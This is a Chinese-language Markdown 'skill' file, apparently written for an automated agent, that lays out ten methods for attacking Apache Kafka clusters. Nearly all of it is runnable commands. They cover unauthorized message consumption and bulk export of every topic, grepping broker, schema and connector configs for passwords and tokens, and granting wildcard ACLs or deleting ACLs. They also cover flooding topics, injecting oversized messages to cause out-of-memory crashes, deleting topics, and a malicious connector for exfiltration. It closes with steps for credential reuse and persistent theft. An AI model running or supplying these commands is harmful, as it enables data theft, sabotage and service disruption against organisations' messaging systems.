---
name: kafka-attack
type: attack
category: messaging
platform: kafka
severity: high
---

# Kafka 攻击技能

## 触发条件

- 发现 Kafka 实例
- 可以访问 Kafka
- 用户要求"攻击 Kafka"

## 前置检查

```bash
# 1. 测试连接
kafka-console-producer --broker-list kafka.example.com:9092 --topic test

# 2. 列出所有 Topic
kafka-topics --list --bootstrap-server kafka.example.com:9092

# 3. 获取集群信息
kafka-broker-api-versions --bootstrap-server kafka.example.com:9092
```

## 攻击方法

### 方法 1: 未授权访问

```bash
# 1. 测试未授权访问
kafka-console-consumer \
  --bootstrap-server kafka.example.com:9092 \
  --topic test \
  --from-beginning \
  --max-messages 10

# 2. 尝试常见默认凭证
# Kafka 默认无认证，除非配置了 SASL/SSL

# 3. 测试 SASL 认证
kafka-console-consumer \
  --bootstrap-server kafka.example.com:9092 \
  --topic test \
  --consumer.config /tmp/sasl.conf \
  --from-beginning
```

### 方法 2: Topic 枚举

```bash
# 1. 列出所有 Topic
kafka-topics --list --bootstrap-server kafka.example.com:9092

# 2. 获取 Topic 详情
kafka-topics --describe \
  --bootstrap-server kafka.example.com:9092 \
  --topic TOPIC_NAME

# 3. 获取 Topic 配置
kafka-configs --bootstrap-server kafka.example.com:9092 \
  --entity-type topics --entity-name TOPIC_NAME --describe

# 4. 搜索敏感 Topic
kafka-topics --list --bootstrap-server kafka.example.com:9092 | \
  grep -i -E "password|secret|credential|auth|token|sensitive"
```

### 方法 3: 消息窃取

```bash
# 1. 消费所有消息
kafka-console-consumer \
  --bootstrap-server kafka.example.com:9092 \
  --topic TOPIC_NAME \
  --from-beginning \
  --max-messages 10000 > /tmp/kafka-messages.txt

# 2. 监听实时消息
kafka-console-consumer \
  --bootstrap-server kafka.example.com:9092 \
  --topic TOPIC_NAME

# 3. 从特定 Offset 消费
kafka-console-consumer \
  --bootstrap-server kafka.example.com:9092 \
  --topic TOPIC_NAME \
  --partition 0 \
  --offset 100

# 4. 批量导出所有 Topic 消息
for topic in $(kafka-topics --list --bootstrap-server kafka.example.com:9092); do
  echo "=== Exporting $topic ==="
  kafka-console-consumer \
    --bootstrap-server kafka.example.com:9092 \
    --topic $topic \
    --from-beginning \
    --max-messages 10000 > /tmp/$topic.txt
done
```

### 方法 4: Consumer Group 利用

```bash
# 1. 列出所有 Consumer Group
kafka-consumer-groups --bootstrap-server kafka.example.com:9092 --list

# 2. 获取 Consumer Group 详情
kafka-consumer-groups --bootstrap-server kafka.example.com:9092 \
  --group GROUP_NAME --describe

# 3. 查看 Lag（可能包含敏感数据）
kafka-consumer-groups --bootstrap-server kafka.example.com:9092 \
  --group GROUP_NAME --describe --members

# 4. 重置 Offset（重新消费数据）
kafka-consumer-groups --bootstrap-server kafka.example.com:9092 \
  --group GROUP_NAME \
  --topic TOPIC_NAME:0 \
  --reset-offsets --to-earliest \
  --execute
```

### 方法 5: Broker 利用

```bash
# 1. 获取 Broker 信息
kafka-broker-api-versions --bootstrap-server kafka.example.com:9092

# 2. 获取 Broker 配置
kafka-configs --bootstrap-server kafka.example.com:9092 \
  --entity-type brokers --entity-name 0 --describe

# 3. 获取 Broker Metrics
kafka-broker-api-versions --bootstrap-server kafka.example.com:9092 | \
  grep -i "version"

# 4. 搜索敏感配置
kafka-configs --bootstrap-server kafka.example.com:9092 \
  --entity-type brokers --describe | \
  grep -i -E "password|secret|ssl|sasl|credential"
```

### 方法 6: ACL 利用

```bash
# 1. 列出所有 ACL
kafka-acls --bootstrap-server kafka.example.com:9092 --list

# 2. 获取特定 Topic 的 ACL
kafka-acls --bootstrap-server kafka.example.com:9092 \
  --topic TOPIC_NAME --list

# 3. 添加恶意 ACL（如果有权限）
kafka-acls --bootstrap-server kafka.example.com:9092 \
  --add --allow-principal User:* \
  --operation All --topic TOPIC_NAME

# 4. 删除 ACL（干扰正常操作）
kafka-acls --bootstrap-server kafka.example.com:9092 \
  --remove --topic TOPIC_NAME
```

### 方法 7: Schema Registry 利用

```bash
# 1. 如果使用 Confluent Schema Registry
curl http://schema-registry.example.com:8081/subjects

# 2. 获取所有 Schema
curl http://schema-registry.example.com:8081/subjects

# 3. 获取特定 Schema
curl http://schema-registry.example.com:8081/subjects/TOPIC_NAME-value/versions/latest

# 4. Schema 中可能包含敏感字段定义
curl -s http://schema-registry.example.com:8081/subjects/TOPIC_NAME-value/versions/latest | \
  jq -r '.schema' | grep -i -E "password|secret|token"
```

### 方法 8: 生产恶意消息

```bash
# 1. 向敏感 Topic 发送消息
kafka-console-producer \
  --bootstrap-server kafka.example.com:9092 \
  --topic SENSITIVE_TOPIC \
  --property "parse.key=true" \
  --property "key.separator=:" \
  --broker-list kafka.example.com:9092 < /tmp/malicious-messages.txt

# 2. 创建恶意消息
echo "malicious_key:malicious_value_with_secret_data" | \
  kafka-console-producer \
    --bootstrap-server kafka.example.com:9092 \
    --topic TOPIC_NAME

# 3. 批量发送
for i in {1..1000}; do
  echo "key_$i:malicious_message_$i" | \
    kafka-console-producer \
      --bootstrap-server kafka.example.com:9092 \
      --topic TOPIC_NAME
done
```

### 方法 9: 数据注入攻击

```bash
# 1. 修改序列化格式
# 如果应用使用 Avro/JSON，注入无效数据

# 2. 创建无效消息
echo "invalid_xml_data" | kafka-console-producer \
  --bootstrap-server kafka.example.com:9092 \
  --topic TOPIC_NAME \
  --property "parse.key=false"

# 3. 注入超大消息（可能导致 OOM）
head -c 100000000 /dev/urandom | \
  kafka-console-producer \
    --bootstrap-server kafka.example.com:9092 \
    --topic TOPIC_NAME

# 4. 删除 Topic
kafka-topics --bootstrap-server kafka.example.com:9092 \
  --delete --topic TOPIC_NAME
```

### 方法 10: 连接器利用

```bash
# 1. 如果使用 Kafka Connect
curl http://kafka-connect.example.com:8083/connector-plugins

# 2. 列出所有连接器
curl http://kafka-connect.example.com:8083/connectors

# 3. 获取连接器配置（可能包含凭证）
curl http://kafka-connect.example.com:8083/connectors/CONNECTOR_NAME/config

# 4. 搜索敏感配置
curl -s http://kafka-connect.example.com:8083/connectors/*/config | \
  jq -r '.config | to_entries[] | select(.key | test("password|secret|token|credential"; "i"))'

# 5. 创建恶意连接器（数据外泄）
curl -X POST http://kafka-connect.example.com:8083/connectors \
  -H "Content-Type: application/json" -d '{
    "name": "malicious-connector",
    "config": {
      "connector.class": "FileStreamSinkConnector",
      "tasks.max": "1",
      "file": "/tmp/exfiltrated-data.txt",
      "topics": "sensitive-topic"
    }
  }'
```

## 验证成功

```bash
# 成功列出 Topic
kafka-topics --list --bootstrap-server kafka.example.com:9092

# 成功消费消息
kafka-console-consumer \
  --bootstrap-server kafka.example.com:9092 \
  --topic TOPIC_NAME \
  --from-beginning \
  --max-messages 10

# 成功获取配置
kafka-configs --bootstrap-server kafka.example.com:9092 \
  --entity-type topics --entity-name TOPIC_NAME --describe
```

## 下一步

1. 分析窃取的消息中的敏感信息
2. 使用发现的凭证访问其他系统
3. 通过 Kafka 建立持久化数据窃取
4. 攻击使用 Kafka 的应用程序
